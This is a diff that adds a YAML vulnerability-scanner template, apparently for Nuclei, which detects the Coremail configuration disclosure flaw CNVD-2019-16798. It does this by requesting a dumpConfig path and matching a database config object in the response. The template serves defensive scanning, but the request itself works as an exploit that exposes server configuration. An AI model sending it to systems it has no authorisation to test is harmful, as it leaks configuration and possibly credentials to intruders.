@@ -1,0 +1,22 @@
+id: coremail-cnvd-2019-16798
+info:
+  name: "Coremail 配置披露漏洞 (CNVD-2019-16798)"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Coremail
+  description: |
+    This template detects the Coremail configuration disclosure vulnerability identified as CNVD-2019-16798.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<object name=\"cm_md_db\">"
+        part: body
